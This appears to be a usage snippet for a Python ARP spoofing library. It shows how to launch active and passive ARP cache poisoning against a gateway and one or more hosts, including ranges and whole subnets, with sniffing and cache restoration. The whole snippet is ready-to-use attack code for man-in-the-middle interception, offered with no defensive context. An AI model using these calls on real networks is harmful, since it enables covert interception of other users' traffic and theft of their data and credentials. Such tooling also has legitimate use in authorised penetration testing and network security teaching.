from ArpSpoof import SpooferARP

spoofer = SpooferARP('192.168.1.1', '192.168.1.158')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('192.168.1.1', '192.168.1.158', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()                                   # only with asynchronous mode
spoofer.restore()                                        # only with asynchronous mode

# Multiple targets
spoofer = SpooferARP('127.0.0.1', '127.0.0.2,127.0.0.3') # Spoof multiple targets
spoofer = SpooferARP('127.0.0.1', '127.0.0.2-127.0.0.5') # Spoof range of targets
spoofer = SpooferARP('127.0.0.1', '127.0.0.0/30')        # Spoof all network